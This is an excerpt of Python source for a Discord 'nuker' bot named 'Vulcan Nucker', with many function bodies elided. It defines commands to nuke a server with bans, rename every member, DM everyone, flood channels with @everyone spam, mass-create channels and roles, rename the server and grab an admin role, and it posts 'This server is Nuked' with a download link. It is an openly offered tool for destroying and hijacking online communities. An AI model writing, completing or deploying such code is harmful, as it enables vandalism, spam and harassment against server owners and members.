...
print(f'{colors["main"]}\n\n                  __  __  __   __  ______ __  ______ __      ______  _____     ' + "\n"
      ...
      "\n"
      "\n"
      f"{colors['white']}                           Author: {colors['main']}!Gvol#3213\n"
      f"{colors['white']}                           Version: {colors['main']}{version} {checkVersion()}\n"
      f"{colors['white']}                           GitHub: {colors['main']}https://github.com/SOON\n\n{colors['white']}")
...
try:
    ...
    activity = {"type": "playing",
                "text": f"Vulcan Nucker v{version}",
                "isenabled": True}
    enablelogging = False
    config = {
        "token": token,
...
async def help(ctx):
    ...
    embed.set_author(name="Vulcan Nucker",
...
@commands.check(isOwner)
async def settingsActivity(ctx, action, activityType="playing", *, text=f"Vulcan Nucker v{version}"):
    global config
    global activity
    if action == "set":
...
@commands.check(isWhitelisted)
async def nuke(ctx, ban: bool = True, text: str = "Vulcan Nucker"):
    await msg_delete(ctx)
    ...
    try:
        ...
        embed.add_field(name="This server is Nuked",
                        value="By Unitled Nuker\nDownload: https://github.com/SOON", inline=False)
        channel = await ctx.guild.create_text_channel(name="Vulcan Nucker")
...
@commands.check(isWhitelisted)
async def renameEveryone(ctx, *, name="Vulcan Nucker"):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        if m.id not in owners:
            try:
...
@commands.check(isWhitelisted)
async def dmEveryone(ctx, *, msg="Vulcan Nucker"):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        if m.id not in owners:
            try:
...
@commands.check(isWhitelisted)
async def spamToAllChannels(ctx, amount: int = 50, *, text="@everyone Vulcan Nucker"):
    await msg_delete(ctx)
...
@commands.check(isWhitelisted)
async def spamToCurrentChannel(ctx, amount: int = 50, *, text="@everyone Vulcan Nucker"):
    await msg_delete(ctx)
    for i in range(amount):
        try:
...
@commands.check(isWhitelisted)
async def spamWithChannels(ctx, amount: int = 25, *, name="Vulcan Nucker"):
    await msg_delete(ctx)
    for i in range(amount):
        try:
...
@commands.check(isWhitelisted)
async def spamWithRoles(ctx, amount: int = 25, *, name="Vulcan Nucker"):
    await msg_delete(ctx)
    for i in range(amount):
        try:
...
@commands.check(isWhitelisted)
async def editServerName(ctx, *, name="Vulcan Nucker"):
    await msg_delete(ctx)
    try:
...
@commands.check(isWhitelisted)
async def getAdmin(ctx, *, rolename="Vulcan Nucker"):
    await msg_delete(ctx)
    try:
...
async def reviveGuild(ctx, guildId: int = None):
    if guildId:
        ...
        try:
            await guild.create_text_channel(name="Vulcan Nucker")
